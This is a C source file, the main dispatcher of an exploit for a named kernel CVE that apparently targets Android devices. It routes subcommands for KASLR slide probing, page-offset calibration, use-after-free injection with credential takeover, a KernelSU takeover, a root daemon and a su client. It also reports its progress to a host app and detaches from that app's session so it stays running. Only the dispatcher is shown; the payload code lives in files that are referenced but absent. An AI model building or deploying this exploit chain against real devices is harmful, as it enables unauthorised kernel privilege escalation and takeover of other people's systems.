/*
 * CVE-2026-98260 Exploit - Main Entry
 *
 * subcommand dispatch:
 *   - calibrate-a:  KASLR slide probe (C rewrite of capture_site.sh + slide_from_timers.py)
 *   - calibrate-b:  page_offset calibration (C rewrite of calib.sh + solve_lmap.py)
 *   - exploit:      UAF injection + cred takeover (incl. rootd)
 *   - ksu-takeover: KernelSU takeover (run as uid=0 via rootd)
 *   - su:           su client (connects to rootd socket)
 *   - dump-config:  print the loaded kernel table (debug)
 *
 * Stage status is emitted on stdout as "\\x1eC98260_STATUS <stage> <status>",
 * parsed by the host Shizuku UserService tailer which then calls back onProgress.
 *
 * Important: subcommand argv[1] may also be the internal bootstrap "--exec-ok"
 * (uaf_plant.c's exec_fn does execve("/proc/self/exe", {"uaf_plant","--exec-ok"})),
 * the fast-exit branch at the top of the reference main() must be preserved verbatim, otherwise the child re-runs
 * the exploit instead of exiting immediately, breaking the UAF timing window.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "kernel_table.h"
#include "calib.h"
#include "ksu.h"

/* subcommand entry points (provided by each .c, renamed from the original main) */
int timer_probe_main(int argc, char **argv);
int uaf_plant_main(int argc, char **argv);
int pc98260_su_main(int argc, char **argv);
int pc98260_rootd_stop_main(int argc, char **argv);

#define STATUS_MARKER "\x1e" "C98260_STATUS"

static void emit_status(const char *stage, const char *status) {
    fprintf(stdout, "%s %s %s\n", STATUS_MARKER, stage, status);
    fflush(stdout);
}

static void print_usage(const char *prog) {
    fprintf(stderr, "usage: %s <command> [args...]\n", prog);
    fprintf(stderr, "\ncommands:\n");
    fprintf(stderr, "  calibrate-a    KASLR slide probe (writes $CVE98260_HOME/slide.txt)\n");
    fprintf(stderr, "  calibrate-b    page_offset calibration (writes $CVE98260_HOME/page_offset.txt)\n");
    fprintf(stderr, "  exploit        UAF injection + cred takeover (--slide --page-offset)\n");
    fprintf(stderr, "  ksu-takeover   KernelSU takeover (via rootd as uid=0)\n");
    fprintf(stderr, "  su <cmd>       su client\n");
    fprintf(stderr, "  rootd-stop     ask the running rootd to shut down\n");
    fprintf(stderr, "  dump-config    dump loaded kernel table\n");
    fprintf(stderr, "\n");
}

/* commands that need the kernel table */
static int needs_profile(const char *cmd) {
    return !strcmp(cmd, "calibrate-a") ||
           !strcmp(cmd, "calibrate-b") ||
           !strcmp(cmd, "exploit") ||
           !strcmp(cmd, "ksu-takeover");
}

int main(int argc, char **argv) {
    /* stdout 被重定向到日志文件时默认 4KB 完全缓冲，进度日志会攒一批才可见；
     * 改为行缓冲，每条 fprintf 即时落盘，APP 侧 tailer(120ms 轮询) 才能实时转发。 */
    setvbuf(stdout, NULL, _IOLBF, 0);
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char *command = argv[1];

    /* uaf_plant bootstrap path: execve("/proc/self/exe", {"uaf_plant","--exec-ok"})
     * -- must match the top-of-main() behavior of the reference uaf_plant.c: exit immediately. */
    if (!strcmp(command, "--exec-ok"))
        _exit(0);

    argc -= 1;
    argv += 1;

    if (!strcmp(command, "help") || !strcmp(command, "--help")) {
        print_usage(argv[0]);
        return 0;
    }
    if (!strcmp(command, "dump-config")) {
        kernel_table_load_from_stdin();
        kernel_table_dump();
        return 0;
    }

    /* load the kernel table first (from the stdin length-prefixed blob), then dispatch */
    if (needs_profile(command)) {
        kernel_table_load_from_stdin();
        /* R4: 默认只保留加载摘要（一行），全量表在 C98260_DUMP=1 或 dump-config 时打印 */
        kernel_table_dump_if_requested();
    }

    if (!strcmp(command, "calibrate-a")) {
        emit_status("calib_a", "running");
        int rc = calib_a_main(argc, argv);
        emit_status("calib_a", rc == 0 ? "ok" : "failed");
        return rc;
    }
    if (!strcmp(command, "calibrate-b")) {
        emit_status("calib_b", "running");
        int rc = calib_b_main(argc, argv);
        /* when calib_b fails it falls back to the profile default; the host downgrades the warning accordingly */
        emit_status("calib_b", rc == 0 ? "ok" : "degraded");
        return rc;
    }
    if (!strcmp(command, "exploit")) {
        emit_status("inject", "running");
        /* detach from the host's process group/session: when the host UserService exits or is unbound,
         * this process and the rootd it forked must keep running (the reference used nohup &) */
        (void)setsid();
        int rc = uaf_plant_main(argc, argv);
        emit_status("inject", rc == 0 ? "ok" : "failed");
        return rc;
    }
    if (!strcmp(command, "ksu-takeover")) {
        emit_status("ksu", "running");
        int rc = ksu_takeover_main(argc, argv);
        emit_status("ksu", rc == 0 ? "ok" : "failed");
        return rc;
    }
    if (!strcmp(command, "su")) {
        return pc98260_su_main(argc, argv);
    }
    if (!strcmp(command, "rootd-stop")) {
        /* Ask the running rootd to shut down so the exploit process can exit.
         * Used after KernelSU took over and provides root on its own. */
        return pc98260_rootd_stop_main(argc, argv);
    }

    fprintf(stderr, "unknown command: %s\n", command);
    print_usage(argv[0]);
    return 1;
}
